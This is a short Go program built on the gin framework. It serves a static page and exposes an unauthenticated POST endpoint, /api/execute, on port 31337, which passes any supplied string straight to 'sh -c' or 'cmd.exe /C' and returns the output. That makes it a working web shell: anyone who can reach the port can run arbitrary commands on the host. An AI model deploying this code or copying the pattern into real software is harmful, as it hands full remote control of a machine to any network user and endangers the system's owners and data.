package main

import (
	"log"
	"net/http"
	"os/exec"
	"runtime"

	"github.com/gin-gonic/gin"
)

type CommandRequest struct {
	Command string `json:"command"`
}

type CommandResponse struct {
	Output string `json:"output,omitempty"`
	Error  string `json:"error,omitempty"`
}

func executeCommand(command string) (string, error) {
	var cmd *exec.Cmd

	if runtime.GOOS == "windows" {
		cmd = exec.Command("cmd.exe", "/C", command)
	} else {
		cmd = exec.Command("sh", "-c", command)
	}

	output, err := cmd.CombinedOutput()
	return string(output), err
}

func main() {
	router := gin.Default()

	// Serve the static HTML file
	router.StaticFile("/", "./static/index.html")

	// POST API to execute commands
	router.POST("/api/execute", func(c *gin.Context) {
		var req CommandRequest
		if err := c.BindJSON(&req); err != nil {
			c.JSON(http.StatusBadRequest, CommandResponse{Error: err.Error()})
			return
		}

		output, err := executeCommand(req.Command)
		if err != nil {
			c.JSON(http.StatusOK, CommandResponse{Output: output, Error: err.Error()})
		} else {
			c.JSON(http.StatusOK, CommandResponse{Output: output})
		}
	})

	if err := router.Run(":31337"); err != nil {
		log.Fatal(err)
	}
}
